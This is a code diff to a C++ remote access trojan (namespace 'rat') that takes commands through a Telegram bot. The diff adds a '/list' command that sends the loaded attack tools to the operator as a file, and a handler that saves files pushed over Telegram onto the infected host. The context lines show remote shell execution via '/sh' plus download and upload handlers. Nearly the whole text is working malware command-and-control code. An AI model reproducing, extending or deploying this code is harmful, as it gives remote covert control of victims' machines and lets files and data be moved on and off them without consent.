@@ -1,9 +1,13 @@
 #include "rat/system.hpp"
 #include "rat/tbot/handler/handleUpdate.hpp"
+#include <algorithm>
 
 #include <cstdint>
+#include <filesystem>
+#include <optional>
 #include "logging.hpp"
 #include "rat/networking.hpp"
+#include "rat/RatState.hpp"
 
 namespace rat::tbot::handler {
 
@@ -21,14 +25,16 @@ static std::string _handleMvCommand(const Command& arg_Command);
 static std::string _handleCpCommand(const Command& arg_Command);
 static std::string _handleSetCommand(Bot& arg_Bot, const Command& arg_Command);
 
-static std::string _handleMessageWithUploadedFiles(const Message& Telegram_Message);
+static std::string _handleListAvailableCommand(Bot& arg_Bot, rat::RatState& Session_State);
+
+static std::string _handleMessageWithUploadedFiles(Bot& arg_Bot, const Message& Telegram_Message);
 
 static std::string _handleDownloadCommand(rat::networking::Client& Curl_Client, const Command& arg_Command);
 static std::string _handleUploadCommand(rat::networking::Client& Curl_Client ,const Command& arg_Command);
 
 
 // ---------- Main Command Dispatcher ----------
-static std::string _handleCommand(Bot& arg_Bot, Message& Telegram_Message) {
+static std::string _handleCommand(rat::RatState& Session_State, Bot& arg_Bot, Message& Telegram_Message) {
     if (Telegram_Message.text.empty() || Telegram_Message.text[0] != '/') {
         return "Not a command";
     }
@@ -38,6 +44,9 @@ static std::string _handleCommand(Bot& arg_Bot, Message& Telegram_Message) {
     // Launch separate processes on detached threads
     if (strncmp(text, "/sh", 3) == 0) {
         return _parseAndHandleShellCommand(Telegram_Message);
+    }
+    if(strncmp(text, "/list", 4) == 0) {
+        return _handleListAvailableCommand(arg_Bot, Session_State);
     }
 
     if (strncmp(text, "/process", 8) == 0) {
@@ -92,25 +101,39 @@ static std::string _handleCommand(Bot& arg_Bot, Message& Telegram_Message) {
 
 /*ALL of this module does is expose this one function handleUpdate()*/
 // ---------- Entry Point ----------
-void handleUpdate(Bot& arg_Bot, const Update& arg_Update) {
+void handleUpdate(rat::RatState& arg_State, Bot& arg_Bot, const Update& arg_Update) {
     Message telegram_message = std::move(arg_Update.message);
     if (telegram_message.id == 0) return;
 
     std::string response;
 
-    response = _handleMessageWithUploadedFiles(telegram_message);
+    response = _handleMessageWithUploadedFiles(arg_Bot, telegram_message);
     if (!response.empty()) {
         arg_Bot.sendMessage(response);
         return;
     }
 
-    response = _handleCommand(arg_Bot, telegram_message);
+    response = _handleCommand(arg_State, arg_Bot, telegram_message);
     if (!response.empty()) {
         arg_Bot.sendMessage(response);
         return;
     }
 
     DEBUG_LOG("No handler produced a response for message_id {}", telegram_message.id);
+}
+static std::string _handleListAvailableCommand(Bot& arg_Bot, rat::RatState& Session_State) {
+    std::filesystem::path file_path(rat::system::getCurrentDateTime_Underscored());
+    std::vector<std::string> tools = Session_State.listDynamicTools();
+    std::sort(tools.begin(), tools.end());
+    bool result = rat::system::echo(tools, file_path);
+    if(result) {
+        arg_Bot.sendFile(file_path);
+        std::filesystem::remove(file_path);
+    }else{
+        arg_Bot.sendMessage("Failed at constructing the file and sending it");
+    }
+    return "finished";
+    
 }
 // ---------- Helper ----------
 static uint16_t __stringToUint16(const std::string& str) {
@@ -338,11 +361,36 @@ static std::string _handleSetCommand(Bot& arg_Bot, const Command& arg_Command) {
     return fmt::format("Unknown variable: {}", variable);
 }
 
-static std::string _handleMessageWithUploadedFiles(const Message& Telegram_Message) {
-    if (Telegram_Message.files.empty()) return "";
-    return fmt::format("Received {} uploaded file(s)", Telegram_Message.files.size());
-}
+static std::string _handleMessageWithUploadedFiles(Bot& arg_Bot, const Message& Telegram_Message) {
+    if (Telegram_Message.files.empty())  return "";
 
+    const std::vector<rat::tbot::File>& files = Telegram_Message.files;
+    std::ostringstream response_buffer; // for collecting per-file messages
+
+    for (const auto& file : files) {
+        std::filesystem::path file_path = std::filesystem::current_path();
+
+        // Determine the file name
+        if (file.name.has_value() && !file.name->empty()) {
+            file_path /= file.name.value();
+        } else {
+            file_path /= std::filesystem::path(rat::system::getCurrentDateTime_Underscored());
+        }
+
+        // Download the file
+        if(arg_Bot.downloadFile(file.id, file_path)) {
+        // Log the downloaded file
+            response_buffer << "File: " << file_path.string() << " has been downloaded\n";
+        }else {
+            response_buffer << "File: " << file_path.string() << " has not been downloaded\n";
+        }
+                // Optionally, include per-file messages plus total count
+        response_buffer << fmt::format("Received {} uploaded file(s)", files.size());
+    }
+
+
+    return response_buffer.str();
+}
 
 
 
